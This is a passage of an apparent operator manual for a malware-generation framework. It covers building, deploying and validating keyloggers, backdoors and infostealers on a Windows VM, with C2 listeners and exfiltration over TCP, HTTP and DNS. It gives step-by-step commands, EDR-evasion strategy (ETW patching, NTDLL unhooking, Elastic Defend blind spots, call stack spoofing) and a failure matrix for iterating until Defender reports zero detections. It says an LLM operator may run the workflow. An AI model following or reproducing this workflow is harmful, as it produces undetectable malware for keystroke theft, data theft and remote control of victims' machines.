    'powershell -Command "Get-MpComputerStatus | Select-Object AMServiceEnabled,RealTimeProtectionEnabled,AntivirusEnabled | Format-List"'

# 3. Cleanup previous test artifacts
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'taskkill /f /im payload.exe 2>nul & del C:\Users\vmuser\Desktop\payload.exe 2>nul & schtasks /delete /tn test /f 2>nul'

# 4. Upload binary
sshpass -p 'vmuser123' scp -o StrictHostKeyChecking=no -P 10022 output.exe vmuser@localhost:Desktop/payload.exe

# 5. Wait for Defender scan (3 seconds)
sleep 3

# 6. Check binary survived Defender
EXIST=$(sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'if exist C:\Users\vmuser\Desktop\payload.exe (echo EXISTS) else (echo GONE)' 2>&1 | tr -d '\r')
# CRITICAL: tr -d '\r' is REQUIRED — Windows \r breaks string comparison

# 7. Start C2 listener (varies by malware type — see §12)

# 8. Execute via schtasks (runs in interactive desktop session)
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'schtasks /create /tn test /tr "C:\Users\vmuser\Desktop\payload.exe" /sc once /st 00:00 /f >nul 2>&1 && schtasks /run /tn test >nul 2>&1'

# 9. Wait for C2 data + validate (see §13)

# 10. Check Defender detections
DET=$(sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>&1 | tr -d '\r')

# 11. Cleanup
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'taskkill /f /im payload.exe 2>nul & del C:\Users\vmuser\Desktop\payload.exe 2>nul & schtasks /delete /tn test /f 2>nul'
```

### Why schtasks (not direct SSH execution)

Keylogger's `GetAsyncKeyState` and `WH_KEYBOARD_LL` hooks only capture from their session. SSH runs in Session 0 (services). The interactive desktop is Session 1+. Using `schtasks /create /tn test /tr "..." /sc once /st 00:00 /f` with `/rl highest` forces execution in the interactive session where keystrokes actually happen.

For backdoors and infostealers, schtasks is still preferred because it simulates realistic execution conditions (not a child of sshd).

---

## 12. C2 Protocols and Listeners

### Backdoor — TLV Protocol (TCP)

Binary framing: `{uint32_t cmd_id, uint32_t payload_len}` + `payload[payload_len]`

| cmd_id | Name | Direction |
|--------|------|-----------|
| 0x01 | HEARTBEAT | implant → C2 |
| 0x02 | SYSINFO | C2 → implant (request) + implant → C2 (response) |
| 0x03 | PROCESSES | bidirectional |
| 0x04 | FILELIST | bidirectional |
| 0x05 | FILEREAD | bidirectional |
| 0x06 | FILEWRITE | bidirectional |
| 0x07 | SCREENSHOT | bidirectional |
| 0x08 | REGISTRY | bidirectional |
| 0x09 | NETINFO | bidirectional |
| 0x0A | EXEC_CMD | bidirectional |
| 0x0B | EXEC_PS | bidirectional |
| 0x0D | EXIT | C2 → implant |
| 0xFF | NOOP | C2 → implant (keepalive) |

**C2 listener**: `python3 scripts/c2_backdoor.py --port 9001`
- `--test-sequence`: Automated test — waits for heartbeat, sends sysinfo, sends processes, sends exit, reports PASS/FAIL
- `--interactive` (default): REPL — type `sysinfo`, `ps`, `ls C:\`, `get file`, `screenshot`, `exit`

### Backdoor — HTTP Protocol (WinHTTP)

Same TLV framing but wrapped in HTTP POST:

| Endpoint | Purpose | Body |
|----------|---------|------|
| `POST /beacon` | Poll for commands (implant sends heartbeat, C2 responds with next command) | TLV frame |
| `POST /result` | Send command result | TLV frame |

**C2 listener**: Need a Python HTTP server that speaks TLV inside HTTP POST bodies. Example in the scratchpad (`http_c2_test.py`).

### Keylogger/Infostealer — Raw TCP

One-shot or periodic TCP send of the global `g_data` buffer contents. No framing — raw text/binary blob.

**C2 listener**: `timeout 70 nc -l -p 9001 > capture.bin`

For periodic flush (keylogger with `tcp_flush`): nc exits after first connection closes, so keylogger reconnects and nc is gone. For automated testing, the `--batch` flag makes the keylogger do one 30-second capture and send everything in one connection.

### Keylogger/Infostealer — WinHTTP

HTTP POST to `/` with the buffer as body.

**C2 listener**: Raw nc works — captures the HTTP request including headers+body as raw bytes. Or use a proper HTTP server.

### Keylogger/Infostealer — DNS

Encodes data into DNS TXT queries. Requires a DNS server configured to log queries. Not testable with nc. The DNS exfil is confirmed to compile and bypass Defender (binary survives), but needs a DNS C2 server for full functional testing.

---

## 13. Validation Criteria

### ALL malware types — mandatory checks

| Check | Method | Pass Criteria |
|-------|--------|---------------|
| Binary survives Defender | Check file exists after 3s | `EXISTS` (not `GONE`) |
| Zero Defender detections | `Get-MpThreatDetection` filtered by time | Count = 0 |
| C2 data received | `stat -c%s capture.bin` | Size > 0 |

### Backdoor-specific

| Check | Method | Pass Criteria |
|-------|--------|---------------|
| Heartbeat received | C2 server log | cmd_id=0x01 within 45s |
| Sysinfo response | C2 server log | cmd_id=0x02 response with hostname |
| Processes response | C2 server log | cmd_id=0x03 response with process list |
| Clean exit | C2 server log | cmd_id=0x0D acknowledged |

### Keylogger-specific

| Check | Method | Pass Criteria |
|-------|--------|---------------|
| Hook active | Parse C2 data | Contains `Hook: ACTIVE` |
| Self-test pass | Parse C2 data | Contains `self_test=PASS` |
| Keys captured | Parse C2 data | Contains `keys=2` (injected markers) |
| System info present | Parse C2 data | Contains `=== SYSTEM INFO ===` with hostname |

### Infostealer-specific

| Check | Method | Pass Criteria |
|-------|--------|---------------|
| System info section | `strings capture.bin \| grep "SYSTEM INFO"` | Present |
| Processes section | `strings capture.bin \| grep "RUNNING PROCESSES"` | Present |
| Data volume | File size | > 10KB (sysinfo + processes + screenshot) |

### CRITICAL RULE (from knowledge.md)

**Evasion success ≠ functional success.** A binary that exfiltrates data but gets detected/removed by Defender is an EVASION FAILURE. Zero detections is the requirement, not optional. Post-execution detection means the binary will be blocked on subsequent runs.

---

## 14. Failure Diagnosis and Iteration

### Failure matrix (from knowledge.md)

| Symptom | Root Cause | Fix |
|---------|-----------|-----|
| Binary GONE + 0 detections | Windows `\r` in SSH output breaks comparison | `tr -d '\r'` |
| Binary GONE + detections > 0 | Static detection (Defender ML/signature) | Change binary signature: different obfuscation, reorder functions, change strings |
| Binary EXISTS + 0 C2 bytes | Runtime crash or network issue | Check Event Viewer, verify C2 IP/port, check `fuser PORT/tcp` |
| Binary EXISTS + some C2 bytes | Process killed mid-execution | Check which section is last → that's where it died |
| C2 data received + binary GONE | Behavioral/cloud detection (delayed) | Change runtime behavior: different API patterns, timing |
| C2 data received + detections > 0 | Post-execution Defender cleanup | This is an evasion FAIL — must iterate |
| Keylogger self_test=FAIL | No interactive desktop session | Need logged-in user via auto-login or RDP |
| C2 timeout (keylogger) | Listener started before user setup | Start listener AFTER Enter prompt |
| No stdout from C2 server | Python block-buffering | `python3 -u` + `flush=True` |

### Escalation path

1. Increase obfuscation level
2. Add/change evasion layers (different string encoding, API hashing)
3. Restructure execution flow (change collector order, add delays)
4. Query ChromaDB for alternative techniques: `tech.query(query_texts=['...'], n_results=5, where={'language': 'c_cpp'})`
5. Fundamental approach change (different exfil, process injection, staged execution)

Maximum 5 iterations before reporting failure with analysis.

---

## 15. Known Pitfalls (from knowledge.md)

### Windows SSH `\r` corruption
Every SSH command output used in bash comparisons MUST pipe through `tr -d '\r'`. Windows outputs `\r\n`, the `\r` persists in bash variables, and `"EXISTS\r" != "EXISTS"` always evaluates false. This caused 5 iterations of false "Defender removed binary" reports.

### C2 listener timeout
Start the listener AFTER the user presses Enter / after the binary is launched. Never before. User interaction time is unbounded and eats into operational timeouts.

### VM snapshot method
Use `./scripts/vm_snapshot.sh save|restore` which uses `blockdev-snapshot-sync` overlays. NEVER use QEMU's `savevm`/`loadvm` — they crash pflash (UEFI firmware).

### Console window
ALWAYS compile with `-mwindows`. ALWAYS call `FreeConsole()` at the top of `main()`. A console window popping up on the target desktop is an instant failure.

### Python buffering
For any Python process running in background: `python3 -u` (unbuffered mode) AND `print(..., flush=True)`. Block buffering hides stdout.

### schtasks vs direct execution
Keyloggers MUST run via schtasks in the interactive session. SSH is Session 0 — keystroke hooks don't capture there.

### LOLBin detection
LOLBin child processes (curl.exe, cmd.exe, tasklist.exe, certutil.exe) trigger Elastic Defend SIEM rules. Always prefer API chunks over LOLBin chunks.

---

## 16. EDR-Specific Evasion Strategy

### Windows Defender

**What it does**: Real-time ML + signature scanning on file write. ETW/kernel behavioral monitoring. Cloud-based ML analysis.

**What works**: 42/42 recipes pass (0 detections). Clean binary with string encryption, ETW patch, and NTDLL unhook defeats all Defender detection layers.

**What doesn't matter**: IAT cleanup beyond 3-4 DLLs. XOR key complexity. Heavy obfuscation (actually makes detection worse).

### Elastic Defend (Free Tier)

**What it does**: Kernel minifilter driver collects events. Ships to Elasticsearch. 497 prebuilt EQL/KQL rules match patterns.

**Critical insights**:
1. No behavioral blocking — alert only
2. Scheduled task rules only match LOLBin executables (cmd.exe, powershell.exe, etc.) — custom binaries don't trigger
3. Network rules exclude RFC1918 ranges (10.0.0.0/8) — QEMU NAT traffic is invisible
4. No GetAsyncKeyState or keyboard hook detection rules
5. No DNS tunneling/exfil detection
6. curl.exe and certutil.exe ARE detected

**Strategy**: Zero child processes + raw TCP or WinHTTP exfil + startup folder persistence = 0 alerts.

### Recommendations for other EDRs (from research)

- **CrowdStrike Falcon**: More aggressive behavioral analysis. Need sleep encryption + call stack spoofing + indirect syscalls.
- **SentinelOne**: Strong on behavioral detection. Same as CrowdStrike.
- **Untested**: Our framework's custom code is unique per-build — no shared signatures with any public tool. The TECHNIQUE is public but the CODE is unique.

---

## 17. The Full Workflow End-to-End

This is the complete sequence a malgen operator (human or LLM) follows:

### Step 1: Pick a recipe

```bash
# List all recipes
ls templates/chunks/recipes/*.yaml

# Pick based on target:
# - Infostealer: infostealer_full (max collection) or infostealer_edr_v1 (EDR-focused)
# - Keylogger: keylogger_api (API exfil) or keylogger_stealth_max (all evasion layers)
# - Backdoor: backdoor_tcp_api (simple) or backdoor_tcp_full_evasion (max evasion)
```

### Step 2: Assemble

```bash
python3 templates/chunks/assembler.py templates/chunks/recipes/keylogger_api.yaml \
    -o /tmp/output.c --var C2_IP=10.0.2.2 --var C2_PORT=9001
```

### Step 3: Apply string encryption

```python
from evasion_passes import _encrypt_string_literals
with open('/tmp/output.c') as f: src = f.read()
result = _encrypt_string_literals(src)
with open('/tmp/output.c', 'w') as f: f.write(result)
```

### Step 4: Compile

```bash
x86_64-w64-mingw32-gcc -mwindows -o /tmp/output.exe /tmp/output.c \
    -lws2_32 -liphlpapi -lcrypt32 -lole32 -lshell32 -lgdi32 \
    -lwininet -lwinhttp -ldnsapi -ladvapi32 -luser32 -static
```

### Step 5: Deploy to VM

```bash
# Cleanup
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'taskkill /f /im payload.exe 2>nul & del C:\Users\vmuser\Desktop\payload.exe 2>nul'

# Upload
sshpass -p 'vmuser123' scp -o StrictHostKeyChecking=no -P 10022 /tmp/output.exe \
    vmuser@localhost:Desktop/payload.exe

# Wait for Defender scan
sleep 3

# Check survived
EXIST=$(sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'if exist C:\Users\vmuser\Desktop\payload.exe (echo EXISTS) else (echo GONE)' 2>&1 | tr -d '\r')
```

### Step 6: Start C2 and execute

```bash
# For backdoor (TLV C2):
python3 scripts/c2_backdoor.py --test-sequence --port 9001 --timeout 60 &
C2_PID=$!

# For keylogger/infostealer (raw TCP):
timeout 70 nc -l -p 9001 > /tmp/capture.bin &
C2_PID=$!

# Execute via schtasks
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'schtasks /create /tn test /tr "C:\Users\vmuser\Desktop\payload.exe --batch" /sc once /st 00:00 /f /rl highest >nul 2>&1 && schtasks /run /tn test >nul 2>&1'

# Wait
wait $C2_PID
```

### Step 7: Validate

```bash
# Check C2 data
SIZE=$(stat -c%s /tmp/capture.bin 2>/dev/null || echo 0)

# Check Defender
DET=$(sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>&1 | tr -d '\r')

# Verdict
if [ "$SIZE" -gt 100 ] && [ "$DET" = "0" ]; then
    echo "PASS"
else
    echo "FAIL: ${SIZE} bytes, ${DET} detections"
fi
```

### Step 8: Cleanup

```bash
sshpass -p 'vmuser123' ssh -o StrictHostKeyChecking=no -p 10022 vmuser@localhost \
    'taskkill /f /im payload.exe 2>nul & del C:\Users\vmuser\Desktop\payload.exe 2>nul & schtasks /delete /tn test /f 2>nul'
```

### Step 9: If FAIL, iterate (see §14)

---

## 18. Framework 2 (LLM Pipeline) — Brief

Framework 2 is an alternative path where a local LLM (Qwen 35B) generates the C code instead of the chunk assembler. It shares the same evasion passes, compiler, VM, and validation infrastructure.

**Status**: Templates and prompts work correctly. Evasion passes produce Defender-evading code. However, the local Qwen model generates structurally broken C (infinite loops, wild pointers, uninitialized variables). The chunk assembler (Framework 1) is the reliable production path.

**Key files**:
- `pipeline.py` — orchestrates the LLM generation pipeline
- `generation_engine.py` — constructs prompts with API reference blocks
- `verifier.py` — validates LLM output (compile + deploy + test)
- `evasion_passes.py` — post-LLM transforms (string encryption, API obfuscation, etc.)
- `llm_client.py` — interface to local Ollama LLM

**Not recommended for production use.** Framework 1 (chunk assembler) is deterministic and 42/42 PASS.

---

## Appendix: Current Test Results (2026-07-05)

| Category | Recipes | Compile | VM Test | Defender | Status |
|----------|---------|---------|---------|----------|--------|
| Backdoor TCP | 15 | 15/15 | 15/15 PASS | 0 det | PRODUCTION |
| Backdoor HTTP | 5 | 5/5 | 5/5 PASS | 0 det | PRODUCTION |
| Keylogger | 18 | 18/18 | 18/18 PASS | 0 det | PRODUCTION |
| Infostealer | 4 | 4/4 | 4/4 PASS | 0 det | PRODUCTION |
| **Total** | **42** | **42/42** | **42/42** | **0 det** | **ALL PASS** |

Unit tests: 160/162 passed (2 failures in Framework 2 API obfuscation ordering — not chunk assembler).

## Appendix: Chunk Framework Expansion (2026-07-07)

### Evasion Selector Enhancements

**Sigma/Chainsaw integration**: `evasion_selector.py` now runs `check_sigma_rules()` inside the validation loop — pulls Sysmon EVTX from VM, runs Chainsaw against 2,997 Sigma rules (including 462 emerging-threats). Medium+ hits fail the run.

**EDR management**: Portal exposes live toggle switches for Defender/Sysmon/Wazuh. Evasion selector reads `MALGEN_ACTIVE_EDRS` env var for per-run detection configuration.

**Progress bars**: Per-tier progress display shows immediately (T1: Algo, T2: Local, T3: Cloud).

### Combination Space: 4.32M (was 108K)

Layer expansion to 4.32 million unique behavioral combinations:

| Layer | Options | Key additions |
|-------|---------|---------------|
| api_resolve | 6 | peb_walk, indirect_syscall |
| execution | 10 | callback_enumwindows, callback_certenumsystem, callback_copyfile2, callback_enumrestype |
| process | 9 | ppid_spoof_svchost/runtimebroker/sihost/taskhostw/dllhost |
| timing | 5 | (unchanged) |
| data_obfuscation | 4 | (unchanged) |
| anti_analysis | 5 | (unchanged) |
| exfil | 16 | https_post, http_get_chunks, named_pipe, smb_write, 6 LOLBin methods |
| persistence | 5 | (unchanged) |

### Telemetry Dependency Map

`templates/chunks/telemetry_map.py` maps evasion chunks → detection telemetry sources:

```python
from telemetry_map import get_blind_spots, recommend_evasion_for, score_combination

# What goes dark with ETW patch + ntdll unhook?
blind = get_blind_spots(["etw_patch", "unhook_ntdll"])
# → suppresses ETW-TI, AMSI, ETW Process, usermode hooks
# → process_hollow, APC, fiber, DLL sideload become invisible

# What evasion helps process_hollow?
recs = recommend_evasion_for("process_hollow")
# → etw_patch (suppresses ETW-TI), unhook_ntdll (suppresses hooks)

# Score a combination (0.0=blind, 1.0=fully observed)
score = score_combination(["etw_patch"], ["callback_abuse", "https_post"])
```

### Strategic Analysis

See `research/chunk_vs_malgen_analysis.md` for:
- Chunk framework (breadth/speed/cost) vs malgen skill (depth/creativity)
- Flywheel model: framework stores knowledge, malgen discovers knowledge
- Recombination defeats patch cycles (EDR vendors patch combinations, not primitives)
- Telemetry-aware composition (target shared telemetry roots, not individual rules)
